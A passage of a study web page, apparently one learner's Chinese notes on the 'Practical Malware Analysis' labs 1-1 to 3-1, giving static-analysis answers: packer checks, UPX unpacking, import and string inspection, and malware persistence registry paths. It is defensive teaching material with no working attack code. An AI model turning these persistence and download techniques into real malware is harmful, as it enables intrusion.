+  <div class="hx-flex hx-items-center hx-gap-2 hx-capitalize"><svg height=12 class="group-data-[theme=light]:hx-hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg><span class="group-data-[theme=light]:hx-hidden">Light</span><svg height=12 class="group-data-[theme=dark]:hx-hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg><span class="group-data-[theme=dark]:hx-hidden">Dark</span></div>
+</button>
+</div></div></aside>
+    
+<nav class="hextra-toc hx-order-last hx-hidden hx-w-64 hx-shrink-0 xl:hx-block print:hx-hidden hx-px-4" aria-label="table of contents">
+    <div class="hextra-scrollbar hx-sticky hx-top-16 hx-overflow-y-auto hx-pr-4 hx-pt-6 hx-text-sm [hyphens:auto] hx-max-h-[calc(100vh-var(--navbar-height)-env(safe-area-inset-bottom))] ltr:hx--mr-4 rtl:hx--ml-4"><p class="hx-mb-4 hx-font-semibold hx-tracking-tight">On this page</p><ul>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="hx-font-semibold hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#%e6%81%b6%e6%84%8f%e4%bb%a3%e7%a0%81%e5%88%86%e6%9e%90%e5%ae%9e%e6%88%98%e7%9a%84%e5%ae%9e%e9%aa%8c">《恶意代码分析实战》的实验
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#lab-1-1">Lab 1-1
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#lab-1-2">Lab 1-2
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#lab-1-3">Lab 1-3
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#lab-1-4">Lab 1-4
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#lab-3-1">Lab 3-1
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#lab-3-2">Lab 3-2
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#lab-3-3">Lab 3-3
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#lab-3-4">Lab 3-4
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#lab-5-1">Lab 5-1
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#lab-6-1">Lab 6-1
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#lab-6-2">Lab 6-2
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#lab-6-3">Lab 6-3
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#lab-6-4">Lab 6-4
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#lab-7-1">Lab 7-1
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#lab-7-2">Lab 7-2
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#lab-7-3">Lab 7-3
+        </a>
+      </li></ul>
+      <div class="hx-mt-8 hx-border-t hx-bg-white hx-pt-8 hx-shadow-[0_-12px_16px_white] dark:hx-bg-dark dark:hx-shadow-[0_-12px_16px_#111] hx-sticky hx-bottom-0 hx-flex hx-flex-col hx-items-start hx-gap-2 hx-pb-8 dark:hx-border-neutral-800 contrast-more:hx-border-t contrast-more:hx-border-neutral-400 contrast-more:hx-shadow-none contrast-more:dark:hx-border-neutral-400">
+        <button aria-hidden="true" id="backToTop" onClick="scrollUp();" class="hx-transition-all hx-duration-75 hx-opacity-0 hx-text-xs hx-font-medium hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-100 contrast-more:hx-text-gray-800 contrast-more:dark:hx-text-gray-50">
+          <span>Scroll to top</span>
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="hx-inline ltr:hx-ml-1 rtl:hx-mr-1 hx-h-3.5 hx-w-3.5 hx-border hx-rounded-full hx-border-gray-500 hover:hx-border-gray-900 dark:hx-border-gray-400 dark:hover:hx-border-gray-100 contrast-more:hx-border-gray-800 contrast-more:dark:hx-border-gray-50">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 15.75l7.5-7.5 7.5 7.5" />
+          </svg>
+        </button>
+      </div>
+    </div>
+  </nav>
+
+
+    <article class="hx-w-full hx-break-words hx-flex hx-min-h-[calc(100vh-var(--navbar-height))] hx-min-w-0 hx-justify-center hx-pb-8 hx-pr-[calc(env(safe-area-inset-right)-1.5rem)]">
+      <main class="hx-w-full hx-min-w-0 hx-max-w-6xl hx-px-6 hx-pt-4 md:hx-px-12">
+        
+  <div class="hx-mt-1.5 hx-flex hx-items-center hx-gap-1 hx-overflow-hidden hx-text-sm hx-text-gray-500 dark:hx-text-gray-400 contrast-more:hx-text-current">
+        <div class="hx-whitespace-nowrap hx-transition-colors hx-min-w-[24px] hx-overflow-hidden hx-text-ellipsis hover:hx-text-gray-900 dark:hover:hx-text-gray-100">
+          <a href="/docs/">Docs</a>
+        </div><svg class="hx-w-3.5 hx-shrink-0 rtl:-hx-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg>
+        <div class="hx-whitespace-nowrap hx-transition-colors hx-min-w-[24px] hx-overflow-hidden hx-text-ellipsis hover:hx-text-gray-900 dark:hover:hx-text-gray-100">
+          <a href="/docs/remaining/">Remaining</a>
+        </div><svg class="hx-w-3.5 hx-shrink-0 rtl:-hx-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg><div class="hx-whitespace-nowrap hx-transition-colors hx-font-medium hx-text-gray-700 contrast-more:hx-font-bold contrast-more:hx-text-current dark:hx-text-gray-100 contrast-more:dark:hx-text-current">Lab</div>
+  </div>
+
+        <div class="content">
+          <h1>Lab</h1>
+          <h2>《恶意代码分析实战》的实验<span class="hx-absolute -hx-mt-20" id="恶意代码分析实战的实验"></span>
+    <a href="#%e6%81%b6%e6%84%8f%e4%bb%a3%e7%a0%81%e5%88%86%e6%9e%90%e5%ae%9e%e6%88%98%e7%9a%84%e5%ae%9e%e9%aa%8c" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><h3>Lab 1-1<span class="hx-absolute -hx-mt-20" id="lab-1-1"></span>
+    <a href="#lab-1-1" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><pre><code>----------------
+Lab01-01.exe
+Lab01-01.dll
+----------------
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+实验内容：
+1、将文件上传到http://www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？
+2、这些文件是什么时候编译的？
+3、这两个文件中是否存在迹象说明他们是否被加壳或混淆了？如果是，这些迹象在哪里？
+4、是否有导入函数显示出了这个恶意代码是做什么的？如果是，是哪些导入函数？
+5、是否有任何其他文件或基于主机的迹象，让你可以在受感染系统上查找？
+6、是否有基于网络的迹象，可以用来发现受感染机器上的这个恶意代码？
+7、你猜这些文件的目的是干什么的？
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<ol>
+<li>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/1-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/1-1</a> 1.png)</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/1-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/1-1</a> 2.png)</p>
+</li>
+<li>
+<p>通过pe工具查看时间戳，发现两个文件的编译时间：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/1-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/1-1</a> 3.png)</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/1-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/1-1</a> 4.png)</p>
+</li>
+<li>
+<p>两个文件都用die查一下壳：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/1-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/1-1</a> 5.png)</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/1-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/1-1</a> 6.png)</p>
+<p>发现二者没有壳，但是关于这个dll文件没有导出表：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/1-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/1-1</a> 7.png)</p>
+</li>
+<li>
+<p>看一下exe文件的导入表，就是这个文件用了哪些系统函数：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/1-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/1-1</a> 8.png)</p>
+<p>这两个API的功能是通常用于枚举指定目录中的文件。</p>
+</li>
+<li>
+<p>用记事本打开exe文件可以看到可能对<code>C:\Windows\System32\Kernel32.dll</code>进行了某些操作：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/1-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/1-1</a> 9.png)</p>
+</li>
+<li>
+<p>同样用记事本打开dll文件，可以看到一个ip地址：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/1-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/1-1</a> 10.png)</p>
+</li>
+<li>
+<p>创造一个后门什么的吧🥲</p>
+</li>
+</ol>
+<h3>Lab 1-2<span class="hx-absolute -hx-mt-20" id="lab-1-2"></span>
+    <a href="#lab-1-2" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><pre><code>----------------
+Lab01-02.exe
+----------------
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+实验内容：
+1、将文件上传到http://www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？
+2、是否有这个文件被加壳或混淆的任何迹象？如果是这样，这些迹象是什么？如果该文件被加壳，请进行脱壳。
+3、有没有任何导入函数能够暗示出这个程序的功能？如果是，是哪些导入函数，他们会告诉你什么？
+4、哪些基于主机或基于网络的迹象可以被用来确定这个恶意代码感染的机器？
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<ol>
+<li>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/1-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/1-1</a> 11.png)</p>
+</li>
+<li>
+<p>用die查壳发现是upx壳，在<a href="https://github.com/upx/upx" target="_blank" rel="noopener">这个</a>网址下载upx加壳器后将对应文件放到目录下后输入脱壳指令：</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>upx -d Lab01-02.exe</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>额，就好了。</p>
+</li>
+<li>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/1-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/1-1</a> 12.png)</p>
+</li>
+<li>
+<p>用记事本打开程序：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/1-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/1-1</a> 13.png)</p>
+<p>可以看到一个一个网址，恶意代码可能是想连接到该网址。</p>
+</li>
+</ol>
+<h3>Lab 1-3<span class="hx-absolute -hx-mt-20" id="lab-1-3"></span>
+    <a href="#lab-1-3" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><pre><code>----------------
+Lab01-03.exe
+----------------
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+实验内容：
+1、将文件上传到http://www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？
+2、是否有这个文件被加壳或混淆的任何迹象？如果是这样，这些迹象是什么？如果该文件被加壳，请进行脱壳。
+3、有没有任何导入函数能够暗示出这个程序的功能？如果是，是哪些导入函数，他们会告诉你什么？
+4、哪些基于主机或基于网络的迹象可以被用来确定这个恶意代码感染的机器？
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<ol>
+<li>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/1-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/1-1</a> 14.png)</p>
+</li>
+<li>
+<p>将exe文件拖入linxerUnpacker中，单击&quot;壳特征脱壳&quot;，成功脱壳。</p>
+</li>
+<li>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/1-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/1-1</a> 15.png)</p>
+</li>
+<li>
+<p>用记事本打开程序：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/1-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/1-1</a> 16.png)</p>
+<p>可以看到一个一个网址。</p>
+</li>
+</ol>
+<h3>Lab 1-4<span class="hx-absolute -hx-mt-20" id="lab-1-4"></span>
+    <a href="#lab-1-4" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><pre><code>----------------
+Lab01-04.exe
+----------------
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+实验内容：
+1、将文件上传到http://www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？
+2、是否有这个文件被加壳或混淆的任何迹象？如果是这样，这些迹象是什么？如果该文件被加壳，请进行脱壳。
+3、这个文件是什么时候被编译的？
+4、有没有任何导入函数能够暗示出这个程序的功能？如果是，是哪些导入函数，他们会告诉你什么？
+5、哪些基于主机或基于网络的迹象可以被用来确定这个恶意代码感染的机器？
+6、这个文件在资源段中包含一个资源，使用Restorator工具来检查资源，然后抽取资源。从资源中你能发现什么吗？
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<ol>
+<li>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/1-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/1-1</a> 17.png)</p>
+</li>
+<li>
+<p>用die查看一下，没有壳吧，但发现一个PE资源，可以使用：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/1-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/1-1</a> 18.png)</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/1-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/1-1</a> 22.png)</p>
+<p>全选后转储出来。</p>
+</li>
+<li>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/1-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/1-1</a> 19.png)</p>
+</li>
+<li>
+<p>在导入表中找到如下函数：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/1-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/1-1</a> 20.png)</p>
+<p>这个api是从网络上下载文件并保存到本地的一个操作。</p>
+</li>
+<li>
+<p>用记事本打开拿个我们转储的文件，可以看到一个网址，可能是用上面那个api下载了这个程序：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/1-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/1-1</a> 21.png)</p>
+</li>
+<li>
+<p>好吧，第二步好像已经抽取完资源了，<a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format" target="_blank" rel="noopener">官方文档</a>。</p>
+</li>
+</ol>
+<h3>Lab 3-1<span class="hx-absolute -hx-mt-20" id="lab-3-1"></span>
+    <a href="#lab-3-1" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><pre><code>----------------
+Lab03-01.exe
+----------------
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+实验内容：
+1、找出这个恶意代码的导入函数与字符串列表？
+2、这个恶意代码在主机上的感染特征是什么？
+3、这个恶意代码是否存在一些有用的网络特征码？如果存在，他们是什么？
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<ol>
+<li>
+<p>使用die查看导入表，发现只有一个函数：</p>
+<p>![image](<a href="https://c65mael.github.io/myassets-Lab/3-1" target="_blank" rel="noopener">https://c65mael.github.io/myassets-Lab/3-1</a> 1.png)</p>
+<p><code>ExitProcess</code>是退出进程相关的api函数，字符串可以找到如下：</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><pre><code>SOFTWARE\Classes\http\shell\open\commandV
+Software\Microsoft\Active Setup\Installed Components\
+www.practicalmalwareanalysis.com
+SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
